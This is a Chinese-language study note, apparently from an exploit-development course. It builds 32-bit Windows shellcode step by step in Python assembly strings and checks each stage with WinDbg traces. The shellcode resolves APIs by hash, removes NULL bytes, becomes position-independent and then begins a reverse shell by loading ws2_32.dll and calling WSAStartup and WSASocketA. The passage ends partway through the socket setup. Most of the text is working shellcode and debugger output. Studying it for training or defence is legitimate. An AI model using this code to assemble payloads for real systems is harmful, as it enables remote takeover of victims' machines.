```dbg
0:002> bp 02b40070 

0:002> g
Breakpoint 0 hit
eax=00000000 ebx=76e40000 ecx=0000056e edx=78b5b983 esi=76ec1b7e edi=76eb5940
eip=02b40070 esp=02d3fd30 ebp=02d3ff58 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02b40070 8b5724          mov     edx,dword ptr [edi+24h] ds:0023:76eb5964=00078a70

0:002> u @eip La
02b40070 8b5724          mov     edx,dword ptr [edi+24h]
02b40073 01da            add     edx,ebx
02b40075 668b0c4a        mov     cx,word ptr [edx+ecx*2]
02b40079 8b571c          mov     edx,dword ptr [edi+1Ch]
02b4007c 01da            add     edx,ebx
02b4007e 8b048a          mov     eax,dword ptr [edx+ecx*4]
02b40081 01d8            add     eax,ebx
02b40083 8944241c        mov     dword ptr [esp+1Ch],eax
02b40087 61              popad
02b40088 c3              ret
```
當 Breakpoint 命中時 EDX = 0x78B5B983\
(與目標 Hash 相同。因此 Shellcode 已經找到 TerminateProcess)

逐步執行，最後 EAX 得到 76e6bd30
```dbg
0:002> t
eax=00000000 ebx=76e40000 ecx=0000056e edx=00078a70 esi=76ec1b7e edi=76eb5940
eip=02b40073 esp=02d3fd30 ebp=02d3ff58 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02b40073 01da            add     edx,ebx
...

0:002> t
eax=76e6bd30 ebx=76e40000 ecx=0000056e edx=76eb5968 esi=76ec1b7e edi=76eb5940
eip=02b40083 esp=02d3fd30 ebp=02d3ff58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
02b40083 8944241c        mov     dword ptr [esp+1Ch],eax ss:0023:02d3fd4c=fa5da212

0:002> u @eax
KERNEL32!TerminateProcessStub:
76e6bd30 8bff            mov     edi,edi
76e6bd32 55              push    ebp
76e6bd33 8bec            mov     ebp,esp
76e6bd35 5d              pop     ebp
76e6bd36 ff254c49ec76    jmp     dword ptr [KERNEL32!_imp__TerminateProcess (76ec494c)]
76e6bd3c cc              int     3
76e6bd3d cc              int     3
76e6bd3e cc              int     3
```
> 表示 TerminateProcess VMA = 0x76E6BD30 且 WinDbg 能夠將這個位址解析為 KERNEL32!TerminateProcessStub\ 
> ✅ 成功取得 API VMA

4. 呼叫 TerminateProcess
首先查看 API Prototype：
```cpp
BOOL TerminateProcess(
    HANDLE hProcess,
    UINT   uExitCode
);
```
- hProcess	要終止的 Process Handle
- uExitCode	Process 結束時的 Exit Code

```asm
    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #
```
這條指令等同於：
```cpp
TerminateProcess(
    (HANDLE)-1,
    0
);
```
x86 使用 stdcall 呼叫慣例時，函式參數由右至左 Push

```asm
0:002> t
eax=76e6bd30 ebx=76e40000 ecx=00000000 edx=02b40000 esi=01307890 edi=01301c88
eip=02b40018 esp=02d3fd54 ebp=02d3ff58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
02b40018 31c9            xor     ecx,ecx

0:002> t
eax=76e6bd30 ebx=76e40000 ecx=00000000 edx=02b40000 esi=01307890 edi=01301c88
eip=02b4001a esp=02d3fd54 ebp=02d3ff58 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02b4001a 51              push    ecx

0:002> t
eax=76e6bd30 ebx=76e40000 ecx=00000000 edx=02b40000 esi=01307890 edi=01301c88
eip=02b4001b esp=02d3fd50 ebp=02d3ff58 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02b4001b 6aff            push    0FFFFFFFFh

0:002> t
eax=76e6bd30 ebx=76e40000 ecx=00000000 edx=02b40000 esi=01307890 edi=01301c88
eip=02b4001d esp=02d3fd4c ebp=02d3ff58 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02b4001d ffd0            call    eax {KERNEL32!TerminateProcessStub (76e6bd30)}

0:002> dds @esp L2
02d3fd4c  ffffffff
02d3fd50  00000000
```
>```
>ESP
> |
> +--> 0xFFFFFFFF    hProcess
> |
> +--> 0x00000000    uExitCode
>```

5. 使用 WinDbg 確認 Process 正常結束
```dbg
0:002> p
WARNING: Step/trace thread exited
eax=76e6bd30 ebx=76e40000 ecx=02d3fd34 edx=770a4550 esi=01307890 edi=01301c88
eip=770a4550 esp=02d3fd34 ebp=02d3fd44 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!KiFastSystemCallRet:
770a4550 c3              ret
```
代表執行中的 Thread 已經退出\
![image](https://hackmd.io/_uploads/rk2S8mQRfg.png)

## NULL-Free Position-Independent Shellcode (PIC)
再次執行前面的 Shellcode，並透過 WinDbg 檢查 Opcode：
```dbg
0:002> g
(15e8.1408): Break instruction exception - code 80000003 (first chance)
eax=450240f7 ebx=00000000 ecx=02950000 edx=02950000 esi=02950000 edi=02950000
eip=02950000 esp=02b4fdb0 ebp=02b4fdc0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02950000 cc              int     3

0:002> u @eip L6
02950000 cc              int     3
02950001 89e5            mov     ebp,esp
02950003 81ec00020000    sub     esp,200h
02950009 e811000000      call    0295001f
0295000e 6883b9b578      push    78B5B983h
02950013 e822000000      call    0295003a
```
`sub esp, 0x200`, `call 0295001f` 產生的 Machine Code：
```
81 EC 00 02 00 00
E8 11 00 00 00
```
存在多個 `00`

>[!Important]
>假設透過某個存在 NULL 結尾語意的輸入介面，把 Shellcode 複製到記憶體 `[SHELLCODE][00][REMAINING DATA]`\
>如果 Shellcode 中間出現 0x00，可能會被當成字串結尾
>原始 Shellcode：
>```
> 90 90 90 90 00 90 90 90 90
>```
>複製後：
>```
>90 90 90 90
>```
>> 後面的指令就不會被複製

### Avoiding NULL Bytes
`sub esp, 0x200` 的 Opcode `81 EC 00 02 00 00`\
問題在於 0x200 這個 Immediate Value 在機器碼中以 4 Bytes 表示 `00 02 00 00` 產生 Null Byte\
💡 不一定要更換原本的功能，只需改變達成相同效果的指令\
👉🏻 用 ADD 取代 SUB\
原本 `sub esp, 0x200` 目的是 `ESP = ESP - 0x200`
改成 `add esp, 0xfffffdf0`\
![image](https://hackmd.io/_uploads/rknlhQ7Rfx.png)
> `- 0x210` 比原本多減少 0x10 Bytes，希望調整後的 ESP 位址符合目前 Stack 配置需求，同時避免指令的 Immediate Value 出現 NULL Byte
```dbg
0:002> ? 0x0 - 0x210
Evaluate expression: -528 = fffffdf0

0:002> ? @esp + 0xfffffdf0
Evaluate expression: 4340382624 = 00000001`02b4fba0

0:002> r @esp
esp=02b4fdb0

0:002> ? 0x02b4fdb0 - 0x02b4fba0
Evaluate expression: 528 = 00000210
```
> - 原始 ESP = 0x02B4FDB0
> - 新 ESP   = 0x02B4FBA0
> - 差距     = 0x210

更新 Shellcode:
原本 `sub esp, 0x200` 修改為 `add esp, 0xfffffdf0`

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   add   esp, 0xfffffdf0           ;"  #   Avoid NULL bytes
    "   call  find_kernel32             ;"  #
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call  find_function             ;"  #
...
```
Windbg 確認
```dbg
0:002> u @eip L6
02210000 cc              int     3
02210001 89e5            mov     ebp,esp
02210003 81c4f0fdffff    add     esp,0FFFFFDF0h
02210009 e811000000      call    0221001f
0221000e 6883b9b578      push    78B5B983h
02210013 e822000000      call    0221003a
```
> 修改後的 ADD Opcode `81 C4 F0 FD FF FF` 已沒有 NULL Byte

### Position-Independent Shellcode
>[!note]
>**什麼是 Position-Independent Code（PIC）？**\
>PIC = Position-Independent Code 位置無關程式碼 ?!!\
>一般程式可能會使用固定記憶體位址 `call 0x00401000`\
>這種程式碼依賴目標函式位於特定位置\
>🥚 Shellcode 被注入到不同 Process 時，可能出現在不同的記憶體位址：
>```
>第一次執行：
>0x02900000  Shellcode
>
>第二次執行：
>0x03100000  Shellcode
>
>第三次執行：
>0x01500000  Shellcode
>```
>PIC 的做法：
>```
>不預先假設 Shellcode 位於哪裡
>              |
>              v
>       執行時動態取得位置
>              |
>              v
>       根據取得的位置運作
>```
>👉🏻 無論 Shellcode 被放在哪裡，都可以動態取得自己的位置

利用 CALL / POP 取得 Shellcode 位址\
CALL 的副作用 `call target`，除了跳轉到目標位置之外，CALL 還會將下一條指令的位址 Push 到 Stack。\
Ex.
```asm
0x1000  call 0x2000
0x1005  mov eax, ebx
```
![image](https://hackmd.io/_uploads/HkeCEVQAGl.png)

先修改 start function:
```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   add   esp, 0xfffffdf0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "  #
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00?
    "   jne   next_module               ;"  #   No: try next module
...
```
在堆疊上騰出一些空間後，直接進入 find_kernel32 函數，而無需使用 CALL 指令。CALL 指令不是必要，移除可以避免相對呼叫產生的 NULL 位元組

find_function_shorten 包含一條 assembly instruction，即跳到 find_function_shorten_bnc 函數的 short jump 指令。由於這兩個函數彼此相鄰，因此 JMP 指令的 Opcode 不會包含 NULL 位元組
```python
    " find_function_shorten:             "  #
    "   jmp find_function_shorten_bnc   ;"  #   Short jump

    " find_function_ret:                 "  #
    "   pop esi                         ;"  #   POP the return address from the stack
    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
    "   jmp resolve_symbols_kernel32    ;"  #

    " find_function_shorten_bnc:         "  #   
    "   call find_function_ret          ;"  #   Relative CALL with negative offset

    " find_function:                     "  #
    "   pushad                          ;"  #   Save all registers
    
    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #

    " resolve_symbols_kernel32:              "
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage

    " exec_shellcode:                    "  #
    "   xor   ecx, ecx                  ;"  #   Null ECX
    "   push  ecx                       ;"  #   uExitCode
    "   push  0xffffffff                ;"  #   hProcess
    "   call dword ptr [ebp+0x10]       ;"  #   Call TerminateProcess
```

執行更新後的 shellcode，在 Windbg 中檢查
```dbg
0:002> g
(f34.1058): Break instruction exception - code 80000003 (first chance)
eax=4fb1077f ebx=00000000 ecx=02900000 edx=02900000 esi=02900000 edi=02900000
eip=02900000 esp=02affb70 ebp=02affb80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02900000 cc              int     3

0:002> u @eip L10
...
02900023 eb06            jmp     0290002b
02900025 5e              pop     esi
02900026 897504          mov     dword ptr [ebp+4],esi
02900029 eb54            jmp     0290007f

0:002> bp 02900023 

0:002> g
Breakpoint 0 hit
eax=4fb1077f ebx=76e40000 ecx=00000000 edx=02900000 esi=013d7808 edi=013d1cb0
eip=02900023 esp=02aff960 ebp=02affb70 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02900023 eb06            jmp     0290002b

0:002> t
eax=4fb1077f ebx=76e40000 ecx=00000000 edx=02900000 esi=013d7808 edi=013d1cb0
eip=0290002b esp=02aff960 ebp=02affb70 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0290002b e8f5ffffff      call    02900025
```
>由於偏移量為負，CALL 不包含任何 NULL 位元組。單步執行該呼叫會將 return instruction 壓入 stack。讓 return address 指向 find_function 函數


```dbg
0:002> t
eax=4fb1077f ebx=76e40000 ecx=00000000 edx=02900000 esi=013d7808 edi=013d1cb0
eip=02900025 esp=02aff95c ebp=02affb70 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02900025 5e              pop     esi

0:002> dds @esp L1
02aff95c  02900030

0:002> u poi(@esp)
02900030 60              pushad
02900031 8b433c          mov     eax,dword ptr [ebx+3Ch]
02900034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
02900038 01df            add     edi,ebx
0290003a 8b4f18          mov     ecx,dword ptr [edi+18h]
0290003d 8b4720          mov     eax,dword ptr [edi+20h]
02900040 01d8            add     eax,ebx
02900042 8945fc          mov     dword ptr [ebp-4],eax
```
>接下來的兩個指令會將 find_function 函數的位址 POP 到 ESI，並將其儲存到 EBP 指向的 offset 0x04 記憶體位置
```dbg
0:002> t
eax=4fb1077f ebx=76e40000 ecx=00000000 edx=02900000 esi=02900030 edi=013d1cb0
eip=02900026 esp=02aff960 ebp=02affb70 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02900026 897504          mov     dword ptr [ebp+4],esi ss:0023:02affb74=00000000

0:002> u @esi 
02900030 60              pushad
02900031 8b433c          mov     eax,dword ptr [ebx+3Ch]
02900034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
02900038 01df            add     edi,ebx
0290003a 8b4f18          mov     ecx,dword ptr [edi+18h]
0290003d 8b4720          mov     eax,dword ptr [edi+20h]
02900040 01d8            add     eax,ebx
02900042 8945fc          mov     dword ptr [ebp-4],eax

0:002> t
eax=4fb1077f ebx=76e40000 ecx=00000000 edx=02900000 esi=02900030 edi=013d1cb0
eip=02900029 esp=02aff960 ebp=02affb70 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02900029 eb54            jmp     0290007f

0:002> u poi(@ebp + 0x04)
02900030 60              pushad
02900031 8b433c          mov     eax,dword ptr [ebx+3Ch]
02900034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
02900038 01df            add     edi,ebx
0290003a 8b4f18          mov     ecx,dword ptr [edi+18h]
0290003d 8b4720          mov     eax,dword ptr [edi+20h]
02900040 01d8            add     eax,ebx
02900042 8945fc          mov     dword ptr [ebp-4],eax
```
> find_function_ret 的最後一條指令是 short jump 到 resolve_symbols_kernel32 函數，使用 indirect call 來避免 NULL bytes

```dbg
0:002> t
eax=4fb1077f ebx=76e40000 ecx=00000000 edx=02900000 esi=02900030 edi=013d1cb0
eip=0290007f esp=02aff960 ebp=02affb70 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0290007f 6883b9b578      push    78B5B983h

0:002> t
eax=4fb1077f ebx=76e40000 ecx=00000000 edx=02900000 esi=02900030 edi=013d1cb0
eip=02900084 esp=02aff95c ebp=02affb70 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02900084 ff5504          call    dword ptr [ebp+4]    ss:0023:02affb74=02900030

0:002> p
eax=76e6bd30 ebx=76e40000 ecx=00000000 edx=02900000 esi=02900030 edi=013d1cb0
eip=02900087 esp=02aff95c ebp=02affb70 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
02900087 894510          mov     dword ptr [ebp+10h],eax ss:0023:02affb80=02affbc8

0:002> u @eax
KERNEL32!TerminateProcessStub:
76e6bd30 8bff            mov     edi,edi
76e6bd32 55              push    ebp
76e6bd33 8bec            mov     ebp,esp
76e6bd35 5d              pop     ebp
76e6bd36 ff254c49ec76    jmp     dword ptr [KERNEL32!_imp__TerminateProcess (76ec494c)]
76e6bd3c cc              int     3
76e6bd3d cc              int     3
76e6bd3e cc              int     3
```
> indirect call 不包含任何 NULL bytes。此外，透過逐步檢視可以確認 shellcode 運作正常，並且可以取得 TerminateProcess 的虛擬記憶體位址

移除所有斷點，讓 shellcode 繼續執行:
```dbg
0:002> bc *

0:002> bl

0:002> g
eax=00000101 ebx=013d2868 ecx=016bf87c edx=770a4550 esi=014103e8 edi=014105a8
eip=770a4550 esp=016bf87c ebp=016bfa8c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!KiFastSystemCallRet:
770a4550 c3              ret
```
indirect CALL 避免空位元組的同時，保持 shellcode 的功能。此外 shellcode 現在也與記憶體位置無關，代表我們可以將其注入到記憶體中的任何位置，都會動態地獲取位置

>[!tip]
>**NULL-Free + PIC :**\
>![image](https://hackmd.io/_uploads/SyFMJBQAfl.png)

>[!note]
>WinDbg 指令操作建議：\
>![image](https://hackmd.io/_uploads/SkDDJBQRMe.png)


## Reverse Shell
整體流程:\
![image](https://hackmd.io/_uploads/HkvY15_Rfg.png)

### Loading ws2_32.dll and Resolving Symbols
前面已實作過 find_function，能夠透過 Export Table 和 Hash 找到 kernel32.dll 裡的 API\
現在建立 Reverse Shell，需要用到兩個 DLL 的功能:
DLL | 用途 | API |
:------:|:--------|:--------:|
`kernel32.dll` | Windows 核心程序管理與 DLL 載 | LoadLibraryA、CreateProcessA
`ws2_32.dll` | Windows Sockets 網路功能 | WSAStartup、WSASocketA、WSAConnect

1. 從 kernel32.dll 解析 CreateProcessA
2. 從 kernel32.dll 解析 [LoadLibraryA](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)
3. 呼叫 LoadLibraryA 載入 ws2_32.dll
4. 取得 ws2_32.dll 的 Base Address
5. 重複使用既有的 find_function，解析 Winsock API

編輯原本的 resolve_symbols_kernel32 來載入 ws2_32.dll
```python
    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #

    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later usage
    "   push  0x16b3fe72                ;"  #   CreateProcessA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage
...
```
> 將 LoadLibraryA 和 CreateProcessA ，作為resolve_symbols_kernel32 function 的一部分
> - `0x78b5b983`: API TerminateProcess	[EBP+0x10]
> - `0xec0e4e8e`: LoadLibraryA	[EBP+0x14]
> - `0x16b3fe72`: CreateProcessA	[EBP+0x18]

準備 ws2_32.dll 字串，接著要呼叫 LoadLibraryA，必須先在記憶體中準備 DLL 名稱\
(在不產生 NULL Byte 的情況下，把字串放到 Stack 中)
```python
    " load_ws2_32:                       "  #
    "   xor   eax, eax                  ;"  #   Null EAX
    "   mov   ax, 0x6c6c                ;"  #   Move the end of the string in AX
    "   push  eax                       ;"  #   Push EAX on the stack with string NULL terminator
    "   push  0x642e3233                ;"  #   Push part of the string on the stack
    "   push  0x5f327377                ;"  #   Push another part of the string on the stack
    "   push  esp                       ;"  #   Push ESP to have a pointer to the string
    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA
```
> ![image](https://hackmd.io/_uploads/r1uuP5_RMl.png)\
> 👉🏻 最後組合起來的字串是 `ws2_32.dll\0`

呼叫 LoadLibraryA 並進入 resolve_symbols_ws2_32 function
```python
    " resolve_symbols_ws2_32:            "
    "   mov   ebx, eax                  ;"  #   Move the base address of ws2_32.dll to EBX
    "   push  0x3bfcedcb                ;"  #   WSAStartup hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x1C], eax           ;"  #   Save WSAStartup address for later usage
...
```
LoadLibraryA 成功後，會在 EAX 回傳載入模組的 Handle (模組的 Base Address)\
接著放進 EBX，之前的 find_function 會使用 EBX 作為目前 DLL 的 Base Address：`VMA = DLL Base + RVA`
👉🏻 當 EBX 從 kernel32.dll 的 Base Address 改成 ws2_32.dll 的 Base Address 後，原本的 find_function 就能拿來解析另一個 DLL 的 Export

在 WinDbg 驗證 LoadLibraryA
```dbg
0:002> bp 026000a0 

0:002> bl
     0 e Disable Clear  026000a0     0001 (0001)  0:**** 

0:002> g
Breakpoint 0 hit
eax=76e68d80 ebx=76e40000 ecx=00000000 edx=02600000 esi=02600030 edi=00d31ca0
eip=026000a0 esp=027ffd10 ebp=027fff2c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
026000a0 31c0            xor     eax,eax
```
逐步執行直到對 LoadLibraryA 的呼叫：
```dbg
0:002> r
eax=00006c6c ebx=76e40000 ecx=00000000 edx=02600000 esi=02600030 edi=00d31ca0
eip=026000b2 esp=027ffd00 ebp=027fff2c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
026000b2 ff5514          call    dword ptr [ebp+14h]  ss:0023:027fff40={KERNEL32!LoadLibraryAStub (76e6a5c0)}

0:002> da poi(esp)
027ffd04  "ws2_32.dll"

0:002> p
eax=75070000 ebx=76e40000 ecx=00000000 edx=00000000 esi=02600030 edi=00d31ca0
eip=026000b5 esp=027ffd04 ebp=027fff2c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
026000b5 89c3            mov     ebx,eax

0:002> r @eax
eax=75070000

0:002> lm m ws2_32
Browse full module list
start    end        module name
75070000 750cb000   WS2_32     (deferred)   
```
> ✅ 驗證成功\
> EAX = 0x75070000，而 lm 顯示的 WS2_32 起始位址也是 0x75070000，因此可以確認 DLL 已經載入，且取得了正確的 Base Address

驗證 find_function 能否解析其他 DLL，能夠與 ws2_32.dll 一起 work
```dbg
0:002> t
eax=75070000 ebx=75070000 ecx=00000000 edx=00000000 esi=02600030 edi=00d31ca0
eip=026000b7 esp=027ffd04 ebp=027fff2c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
026000b7 68cbedfc3b      push    3BFCEDCBh

0:002> t
eax=75070000 ebx=75070000 ecx=00000000 edx=00000000 esi=02600030 edi=00d31ca0
eip=026000bc esp=027ffd00 ebp=027fff2c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
026000bc ff5504          call    dword ptr [ebp+4]    ss:0023:027fff30=02600030

0:002> p
eax=750825e0 ebx=75070000 ecx=00000000 edx=00000000 esi=02600030 edi=00d31ca0
eip=026000bf esp=027ffd00 ebp=027fff2c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
026000bf 89451c          mov     dword ptr [ebp+1Ch],eax ss:0023:027fff48=cacdbf08

0:002> u @eax
WS2_32!WSAStartup:
750825e0 8bff            mov     edi,edi
750825e2 55              push    ebp
750825e3 8bec            mov     ebp,esp
750825e5 6afe            push    0FFFFFFFEh
750825e7 6898fb0a75      push    offset WS2_32!StringCopyWorkerW+0x2fc (750afb98)
750825ec 6850680875      push    offset WS2_32!_except_handler4 (75086850)
750825f1 64a100000000    mov     eax,dword ptr fs:[00000000h]
750825f7 50              push    eax
```
> 證明 find_function 不只可以解析 kernel32.dll，也能解析 ws2_32.dll

### Calling WSAStartup
>[!note]
>[WSAStartup](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup) 的用途:\
>載入 ws2_32.dll 之後，還不能直接使用 Socket API\
>必須先呼叫 WSAStartup，初始化 Windows Sockets

Function Prototype：
```cpp
int WSAStartup(
  WORD      wVersionRequired,
  LPWSADATA lpWSAData
);
```
> - `wVersionRequired`: 指定需要的 Winsock 版本
> - `lpWSAData`: 指向 WSADATA 結構的指標，用來接收初始化資訊

選擇 Winsock 2.2，因此 wVersionRequired = 0x0202\
[WSADATA](https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata) 結構與記憶體大小: WSAStartup 的第二個參數需要一個 WSADATA 結構的記憶體空間
```cpp
typedef struct WSAData {
  WORD           wVersion;
  WORD           wHighVersion;
#if ...
  unsigned short iMaxSockets;
#if ...
  unsigned short iMaxUdpDg;
#if ...
  char           *lpVendorInfo;
#if ...
  char           szDescription[WSADESCRIPTION_LEN + 1];
#if ...
  char           szSystemStatus[WSASYS_STATUS_LEN + 1];
#else
  char           szDescription[WSADESCRIPTION_LEN + 1];
#endif
#else
  char           szSystemStatus[WSASYS_STATUS_LEN + 1];
#endif
#else
  unsigned short iMaxSockets;
#endif
#else
  unsigned short iMaxUdpDg;
#endif
#else
  char           *lpVendorInfo;
#endif
} WSADATA;
```
> ![image](https://hackmd.io/_uploads/SJA7miuRzx.png)

>[!tip]
>```
>char szDescription[257];
>char szSystemStatus[129];
>```
>兩個欄位合計：257 + 129 = 386 = 0x182\
>其他欄位：2+2+2+2+4=12\
>因此計算：386+12=398=`0x18E`

WinDbg 中的計算方式：
```dbg
0:002> ? 0x2 + 0x2 + 0x2 + 0x2 + 0x4 + 0n256 + 0n1 + 0n128 + 0n1
Evaluate expression: 398 = 0000018e
```

另外 Shellcode 在前面已經使用 Stack 儲存解析後的 API 位址。現在呼叫 WSAStartup 時，Windows 會把初始化資訊寫入 WSADATA。\
若直接把這個結構放在目前 ESP 附近，後續 Shellcode 的 PUSH、CALL 等操作就可能覆蓋結構內容\
👉🏻 從目前 ESP 往低位址移動一段距離，將那裡作為 WSADATA 的儲存空間
```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes
...
    " call_wsastartup:                   "  #
    "   mov   eax, esp                  ;"  #   Move ESP to EAX
    "   mov   cx, 0x590                 ;"  #   Move 0x590 to CX
    "   sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
    "   push  eax                       ;"  #   Push lpWSAData
    "   xor   eax, eax                  ;"  #   Null EAX
    "   mov   ax, 0x0202                ;"  #   Move version to AX
    "   push  eax                       ;"  #   Push wVersionRequired
    "   call dword ptr [ebp+0x1C]       ;"  #   Call WSAStartup

```
> ![image](https://hackmd.io/_uploads/Hyq5_odCze.png)

WinDbg 驗證
```dbg
0:002> r
eax=00000202 ebx=75070000 ecx=00000590 edx=00000000 esi=02970030 edi=01391ca0
eip=029700e8 esp=02b6f670 ebp=02b6faac iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
029700e8 ff551c          call    dword ptr [ebp+1Ch]  ss:0023:02b6fac8={WS2_32!WSAStartup (750825e0)}

0:002> dds @esp L2
02b6f670  00000202
02b6f674  02b6f0e8

0:002> p
eax=00000000 ebx=75070000 ecx=831d218e edx=00000202 esi=02970030 edi=01391ca0
eip=029700eb esp=02b6f678 ebp=02b6faac iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
029700eb 0000            add     byte ptr [eax],al          ds:0023:00000000=??
```
> WSAStartup 成功回傳 0，代表初始化成功。\
> ⚠️ API 的回傳值是錯誤碼，不是 Boolean。0 代表成功，非 0 則代表初始化失敗，不能把其他非零值一律理解為 TRUE

### Calling WSASocket
[WSASocketA](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa) 的用途: 完成 Winsock 初始化後，下一步就是建立 Socket
```cpp
SOCKET WSAAPI WSASocketA(
  int                 af,
  int                 type,
  int                 protocol,
  LPWSAPROTOCOL_INFOA lpProtocolInfo,
  GROUP               g,
  DWORD               dwFlags
);
```
> 使用 IPv4、使用 TCP、不需要額外的 Protocol Info、Socket Group 或 Flags\
> ![image](https://hackmd.io/_uploads/rJijfEYRfg.png)\
> 三個重要常數：
> - AF_INET      = 2
> - SOCK_STREAM  = 1
> - IPPROTO_TCP  = 6

call_wsasocketa Assembly:
```python
    " call_wsasocketa:                   "  #
    "   xor   eax, eax                  ;"  #   Null EAX
    "   push  eax                       ;"  #   Push dwFlags
    "   push  eax                       ;"  #   Push g
    "   push  eax                       ;"  #   Push lpProtocolInfo
    "   mov   al, 0x06                  ;"  #   Move AL, IPPROTO_TCP
    "   push  eax                       ;"  #   Push protocol
